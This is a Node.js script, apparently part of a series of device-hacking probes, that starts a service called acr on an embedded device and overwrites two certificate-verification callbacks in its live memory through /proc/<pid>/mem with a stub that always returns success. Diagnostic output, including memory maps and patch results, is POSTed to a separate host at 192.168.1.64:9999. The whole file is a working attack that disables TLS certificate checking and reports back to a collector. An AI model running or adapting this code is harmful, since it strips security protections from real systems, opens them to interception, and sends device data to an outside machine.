"use strict";
// audit81.js - (1) clean leftover bind-mounts, (2) verify /usr/bin/acr matches
// known-good offsets, (3) START acr, (4) patch its two cert-verify callbacks
// in memory via dd (node fs is sandboxed for /proc/<pid>/mem).
// Targets (acr non-PIE, VA==mem addr):
//   AcrControlVerifyCertCallback  VA 0x96c08  file off 0x86c08
//   lws_VerifyCertCallback        VA 0x97c84  file off 0x87c84
var http = require("http");
var cp = require("child_process");
var HOST = "192.168.1.64";
var PORT = 9999;

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { try { res.resume(); } catch (e) {} });
    req.on("error", function () {});
    req.write(data);
    req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 15000 }).slice(0, cap || 6000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}
function trim(s) { return (s || "").trim(); }

var T = [
    { name: "AcrControlVerifyCertCallback", foff: 0x86c08, vaddr: 0x96c08 },
    { name: "lws_VerifyCertCallback",       foff: 0x87c84, vaddr: 0x97c84 }
];
var EXPECT = "6de9";  // first 2 bytes of original Thumb prologue at both sites

var out = {};
out.started = new Date().toISOString();

// 1. cleanup any leftover bind-mount of patched libVDCurl / acr
out.cleanup = sh("umount -l /usr/lib/libVDCurl.so.0.9 2>/dev/null; umount -l /usr/bin/acr 2>/dev/null; echo CLEANED");
out.mounts = sh("grep -E 'libVDCurl|/usr/bin/acr' /proc/mounts", 400);

// 2. on-disk acr: md5 + first bytes at known offsets
out.acr_md5 = sh("md5sum /usr/bin/acr", 120);
out.file_bytes = T.map(function (t) {
    return { name: t.name, off: "0x" + t.foff.toString(16),
             head: trim(sh("dd if=/usr/bin/acr bs=1 skip=$((0x" + t.foff.toString(16) + ")) count=4 2>/dev/null | od -An -tx1", 120)) };
});

// 3. start acr (try systemd; fall back to direct exec)
out.start = sh("systemctl start acr.service 2>&1; echo RC=$?", 300);
sh("sleep 3", 100);
out.acr_ps = sh("ps 2>/dev/null | grep '/usr/bin/acr' | grep -v grep | head -3", 600);
out.pidof = sh("pidof acr", 120);
if (trim(out.pidof) === "" || out.pidof.indexOf("ERR") === 0) {
    out.start2 = sh("nohup /usr/bin/acr >/dev/null 2>&1 & echo SPAWNED; sleep 3", 200);
    out.acr_ps = sh("ps 2>/dev/null | grep '/usr/bin/acr' | grep -v grep | head -3", 600);
    out.pidof = sh("pidof acr", 120);
}

// robust pid
var pid = null;
var pm = trim(out.pidof).match(/^(\d+)/);
if (pm) { pid = pm[1]; }
if (!pid) {
    var lines = out.acr_ps.split("\n");
    for (var i = 0; i < lines.length; i++) {
        var mm = lines[i].match(/^\s*\S+\s+(\d+)\s+/);
        if (mm && lines[i].indexOf("/usr/bin/acr") >= 0) { pid = mm[1]; break; }
    }
}
out.pid = pid;

if (!pid) {
    out.patch = "NO_ACR_PID";
    post("/p81_diag", out);
    post("/p81_done", { started: out.started });
} else {
    out.maps = sh("grep '/usr/bin/acr' /proc/" + pid + "/maps | head -3", 500);
    sh("printf '\\x01\\x20\\x70\\x47' > /tmp/.p80stub", 100);
    var res = [];
    T.forEach(function (t) {
        var dec = t.vaddr;
        var before = trim(sh("dd if=/proc/" + pid + "/mem bs=1 skip=" + dec + " count=4 2>/dev/null | od -An -tx1", 120));
        var wr = trim(sh("dd if=/tmp/.p80stub of=/proc/" + pid + "/mem bs=1 seek=" + dec + " count=4 conv=notrunc 2>&1 | tail -1", 120));
        var after = trim(sh("dd if=/proc/" + pid + "/mem bs=1 skip=" + dec + " count=4 2>/dev/null | od -An -tx1", 120));
        res.push({ name: t.name, vaddr: "0x" + t.vaddr.toString(16), before: before, write: wr, after: after,
                   ok: after.indexOf("01 20 70 47") >= 0 });
    });
    out.patch = res;
    post("/p81_patch", out);
    post("/p81_done", { started: out.started });
}
